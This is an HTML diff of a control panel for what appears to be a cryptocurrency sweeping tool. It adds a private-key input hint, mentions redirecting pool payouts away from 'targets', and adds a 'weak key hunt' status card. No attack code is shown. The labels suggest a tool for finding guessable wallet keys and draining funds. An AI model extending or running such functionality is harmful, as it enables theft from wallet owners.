@@ -28,7 +28,7 @@
     </div>
     <div class="row">
       <label class="sw"><input id="active" type="checkbox"> engine on</label>
-      <label class="sw">min $<input id="minUsd" type="number" step="0.5" min="0" value="1"></label>
+      <label class="sw">min $<input id="minUsd" type="number" step="0.05" min="0" value="0.25"></label>
     </div>
     <div class="row">
       <button id="scan" class="ghost">scan now</button>
@@ -42,7 +42,8 @@
   </section>
 
   <section class="card">
-    <h3>sweep keys</h3>
+    <h3>sweep keys <small>wallets you own the private key for</small></h3>
+    <p class="hint">Separate from targets. A swap only redirects future pool payouts. To move coin out of a wallet you must give the key.</p>
     <div class="row">
       <input id="pk" placeholder="private key" autocomplete="off" spellcheck="false">
       <select id="chain">
@@ -61,8 +62,13 @@
   </section>
 
   <section class="card">
+    <h3>weak key hunt <small id="weak">idle</small></h3>
+    <div id="logs" class="logbox"></div>
+  </section>
+
+  <section class="card">
     <h3>log</h3>
-    <pre id="logs"></pre>
+    <pre id="logtail"></pre>
   </section>
 </main>
 
